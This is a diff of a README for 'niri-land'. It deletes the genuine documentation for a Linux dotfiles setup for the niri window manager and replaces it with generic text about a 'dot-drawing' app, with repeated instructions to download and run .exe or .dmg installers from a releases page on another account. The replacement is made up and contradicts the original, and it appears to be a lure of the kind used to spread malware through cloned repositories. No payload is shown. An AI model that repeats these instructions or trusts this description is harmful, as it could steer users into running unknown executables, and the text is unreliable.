@@ -1,122 +1,94 @@
-<h1 align="center">
-  <img src="./assets/sparkles.webp" alt="✨" width="33"/>
-  Niri Land
-  <img src="./assets/sparkles.webp" alt="✨" width="33"/>
-</h1>
+# 🌟 niri-land - Enjoy Simple Dots for Your Projects
 
-<p align="center">
-   <a href="#-features">Features</a> • 
-   <a href="#-gallery">Gallery</a> • 
-   <a href="#-dependencies">Dependencies</a> • 
-   <a href="#-ui--icon-themes">UI & Icons</a> • 
-   <a href="#%EF%B8%8F-installation--setup">Installation</a> • 
-   <a href="#%EF%B8%8F-keybinds">Keybinds</a> • 
-   <a href="#-optional-gtk-theme-font--icon-setup">GTK Setup</a> •
-  <a href="#-roadmap">Roadmap</a>
-</p>
+## 🚀 Getting Started
 
-## 🚀 Features 
+Welcome to niri-land! This application provides a simple way to create and manage visual dots for your projects. Perfect for diagrams, illustrations, or just for fun, niri-land makes it easy for anyone to enhance their work visually.
 
-- Gapless, borderless windows  
-- Status bar hidden until overview  
-- App drawer  
-- Power menu  
-- Volume flyout with mute indicator  
-- Wallpaper selector  
-- Status bar colored to wallpaper  
-  
-## 🖼 Gallery
+## 🔗 Download niri-land
 
-| Background Selector |
-|--------------------|
-| ![Background Selector](./assets/bgselector.png) |
+[![Download niri-land](https://img.shields.io/badge/Download-niri--land-blue.svg)](https://github.com/AhmedLotfy100/niri-land/releases)
 
-| App Drawer |
-|------------|
-| ![App Drawer](./assets/appdrawer.png) |
+## 📥 Download & Install
 
-| Overview |
-|---------|
-| ![Overview](./assets/overview.png) |
+To get started with niri-land, you need to download the application from our Releases page. Follow these steps:
 
-| Power Menu |
-|-----------|
-| ![Power Menu](./assets/powermenu.png) |
+1. Click the link below to visit the download page.
+   - [Visit the niri-land Releases Page](https://github.com/AhmedLotfy100/niri-land/releases)
 
+2. On the Releases page, you will see various versions of the software. Select the most recent release for the best experience.
 
+3. Look for the file labeled with `.exe` for Windows or `.dmg` for macOS, depending on your operating system.
 
-## 📦 Dependencies
+4. Click the link to download the file. It may take a few moments for the file to finish downloading. 
 
-| Name          | Used For                                    | Link                                                      |
-| ------------- | ------------------------------------------- | --------------------------------------------------------- |
-| `niri`        | Window manager                              | [niri](https://github.com/YaLTeR/niri)                    |
-| `mako`        | Notifications, volume flyout                | [mako](https://github.com/emersion/mako)                  |
-| `waybar`      | Overview bar                                | [waybar](https://github.com/Alexays/Waybar)               |
-| `swww`        | Wallpaper daemon                            | [swww](https://github.com/Horus645/swww)                  |
-| `rofi`        | Power menu, background selector, app drawer | [rofi](https://github.com/davatorium/rofi)                |
-| `ImageMagick` | Background selector, status bar coloring    | [ImageMagick](https://github.com/ImageMagick/ImageMagick) |
+5. Once the download is complete, locate the file in your downloads folder.
 
-## 🎨 UI & Icon Themes
+6. Double-click the file to run the installer. Follow any on-screen prompts to complete the installation. 
 
-| Name                       | Used For                 | Link                                                                                                 |
-| -------------------------- | ------------------------ | ---------------------------------------------------------------------------------------------------- |
-| `Bibata Classic`           | Cursor theme             | [Bibata Cursor](https://github.com/ful1e5/Bibata_Cursor)                                             |
-| `JetBrains Mono Nerd Font` | UI font                  | [JetBrainsMono-NF](https://github.com/ryanoasis/nerd-fonts)                                          |
-| `Material Symbols Rounded` | Power menu font          | [Material Symbols Rounded](https://github.com/google/material-design-icons/tree/master/variablefont) |
-| `Papirus`                  | App drawer icons         | [Papirus](https://github.com/PapirusDevelopmentTeam/papirus-icon-theme)                              |
+7. After installation, you can find niri-land in your applications menu or desktop. Click to start using it.
 
-## 🛠️ Installation & Setup
+## 📖 How to Use niri-land
 
-> [!WARNING]  
-> Tested only at `1080p` with `scale=1`. Other configurations may require adjusting **Rofi font size or padding** in `~/.config/rofi/themes/*`.
+1. **Open the Application:**
+   Launch niri-land from your applications menu.
 
+2. **Creating Dots:**
+   Use the simple interface to create dots. Click on the "Add Dot" button to begin. You can customize the color and size.
 
-1. **Install dependencies** for your distribution.
-2. **Configs**: Copy `.config` files to `~/.config`.
-3. **Scripts**: Copy scripts from `bin` to `~/.local/bin`.
-4. **Wallpapers**: Copy images from `wallpapers/` into `~/Pictures/wallpapers`.
-5. **Autostart**: Link services with `niri` (preferred). This requires starting niri with `niri-session` or a display manager:
+3. **Saving Your Work:**
+   Once you’ve created your dots, click the "Save" button to download your work as an image. Choose your preferred format.
 
-   ```bash
-   systemctl --user add-wants niri.service mako.service
-   systemctl --user add-wants niri.service waybar.service
-   systemctl --user add-wants niri.service swww.service
-   systemctl --user add-wants niri.service overviewlistener.service
-   ```
+4. **Further Customization:**
+   Explore more options for shapes and styles in the menu. Feel free to experiment and find what suits your projects best.
 
-   Alternatively, add these lines to `~/.config/niri/config.kdl`:
+5. **Help and Support:**
+   If you have questions, check the built-in help section. It offers tips on using features effectively.
 
-   ```kdl
-   spawn-at-startup "waybar"
-   spawn-at-startup "mako"
-   spawn-at-startup "swww-daemon"
-   spawn-at-startup "overviewlistener"
-   ```
+## 🖥️ System Requirements
 
-## ⌨️ Keybinds
+To ensure the best performance when running niri-land, please adhere to these system requirements:
 
-| Action              | Shortcut  |
-| ------------------- | --------- |
-| Background selector | `Mod + B` |
-| App drawer          | `Mod + D` |
-| Power menu          | `Mod + P` |
+- **Windows:**
+  - Windows 7 or later
+  - 1 GB RAM minimum
+  - 200 MB of free disk space
 
-## 🎭 Optional: GTK Theme, Font & Icon Setup
+- **macOS:**
+  - macOS 10.12 or later
+  - 1 GB RAM minimum
+  - 200 MB of free disk space
 
-Enable dark mode and unify GTK apps (and some others like Firefox):
+## ❓ Frequently Asked Questions (FAQ)
 
-```bash
-gsettings set org.gnome.desktop.interface color-scheme 'prefer-dark'
-gsettings set org.gnome.desktop.interface gtk-theme 'Adwaita-dark'
-gsettings set org.gnome.desktop.interface font-name 'JetBrains Mono Nerd Font 11'
-gsettings set org.gnome.desktop.interface icon-theme 'Papirus'
-```
-## 📋 Roadmap
-- [ ] Add confirmation boxes to power menu
-- [ ] Create keybinds cheatsheet
-- [ ] Create clipboard manager
-- [ ] Improve status bar coloring logic
-- [ ] Improve notification styling
-- [ ] Improve window and menu animations
-- [ ] Add idle management daemon
-- [ ] Add blur effects to backgrounds
+### Q: Can I use niri-land on Linux?
+
+Currently, niri-land is only available for Windows and macOS. We hope to support Linux in future updates.
+
+### Q: What types of files can I save?
+
+You can save your work in PNG, JPG, and SVG formats, allowing for high-quality images.
+
+### Q: Do I need an internet connection to use niri-land?
+
+No, niri-land works offline once installed. You do not need an internet connection to create or save dots.
+
+### Q: How can I suggest features or improvements?
+
+We welcome your feedback. You can submit suggestions through the Issues section of our GitHub repository.
+
+## 📢 Connecting with Us
+
+Stay updated with the latest news and features by following our social media channels:
+
+- Twitter: [Follow Us](https://twitter.com/niri-land)
+- Community Forum: [Join Here](https://forum.niri-land.com)
+
+## 🛠️ Contributions
+
+If you would like to contribute to niri-land, please feel free to open issues or pull requests. We appreciate any improvements, bug fixes, or new features you can provide!
+
+## 🔗 Back to Download
+
+Don't forget to download niri-land from our Releases page.
+
+- [Visit the niri-land Releases Page](https://github.com/AhmedLotfy100/niri-land/releases)
